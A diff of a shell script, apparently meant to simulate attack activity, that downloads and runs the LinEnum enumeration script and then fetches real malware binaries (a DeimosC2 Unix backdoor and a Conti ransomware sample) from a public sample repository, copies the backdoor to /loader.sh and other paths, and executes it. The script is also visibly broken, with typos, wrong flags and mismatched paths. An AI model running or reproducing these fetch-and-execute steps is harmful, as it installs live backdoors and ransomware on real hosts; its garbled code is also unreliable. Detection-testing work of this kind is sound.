@@ -1,70 +1,40 @@
 #!/bin/sh
 
 # SENARIO --- Script Activity /enumeration 
-# Step 1: Set Up Environment Variables and Directories
-export 
-DOWNLOAD_DIR="/tmp/"
-
-# Step 2: Download Enumeration Script using wget or curl
-if command -v wget >/dev/null 2>&1; then
-  echo "[+] Downloading enumeration script using wget..."
-  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O $DOWNLOAD_DIR/enum_script.sh
-elif command -v curl >/dev/null 2>&1; then
-  echo "[+] Downloading enumeration script using curl..."
-  curl -o $DOWNLOAD_DIR/enum_script.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-else
-  echo "[-] Neither wget nor curl is available. Exiting."
-  exit 1
-fi
-sleep 1
+# Step 1 - Download the 
+echo "[+] Downloading enumeration script using wget..."
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O enum_script.sh
 
 # Step 2: Make the Enumeration Script Executable
 echo "[+] Making the enumeration script executable..."
-chmod +x $DOWNLOAD_DIR/enum_script.sh
+chmod +x enum_script.sh
 sleep 10
-
 
 # Step 3: Run the Enumeration Script in a Docker Container
 echo "[+] Running the enumeration script in a Docker container..."
 sh $DOWNLOAD_DIR/enum_script.sh
 sleep 3
 
-
+# SENARIO 1 - Malware 
 # STEP 1 -- Ransomware, Back Door, Conti 
 echo "[+] Downloading C2 and Ransomware samples..."
 # Step 1 - Unix Backdoor Senario 
-if command -v wget >/dev/null 2>&1; then
-  echo "[+] Downloading enumeration script using wget..."
-  wget https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O $DOWNLOAD_DIR/enum_script.sh
-elif command -v curl >/dev/null 2>&1; then
-  echo "[+] Downloading enumeration script using curl..."
-  curl https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -0 $DOWNLOAD_DIR/unixbacdoor.elf
-else
-  echo "[-] Neither wget nor curl is available. Exiting."
-  exit 1
-fi
+echo "[+] Downloading Unixbackdoor Script "
+wget https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O unixbackdoor.sh
 sleep 5
 
 # Create Copies 
-cat $DOWNLOAD_DIR/unixbacdoor.elf > /loader.sh
-cp $DOWNLOAD_DIR/unixbacdoor.elf ~
-cp $DOWNLOAD_DIR/unixbacdoor.elf ~/usr/share/
+cat unixbackdoor.sh > /loader.sh
+cp unixbackdoor.sh ~/usr/share
+sleep 10 
 # make executaable
-chmod +x $DOWNLOAD_DIR/unixbackdoor.elf
+chmod +x unixbackdoor.sh
 # execute 
-sh unixbackdoor.elf
+sh uunixbackdoor.sh
 
 # Step 2 - Conti
-if command -v wget >/dev/null 2>&1; then
-  echo "[+] Downloading enumeration script using wget..."
+echo "[+] Downloading Conti-C2 malware"
   wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O $DOWNLOAD_DIR/conti.sh
-elif command -v curl >/dev/null 2>&1; then
-  echo "[+] Downloading enumeration script using curl..."
-  curl https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -0 $DOWNLOAD_DIR/conti.sh
-else
-  echo "[-] Neither wget nor curl is available. Exiting."
-  exit 1
-fi
 sleep 5
 
 # Make Executable 
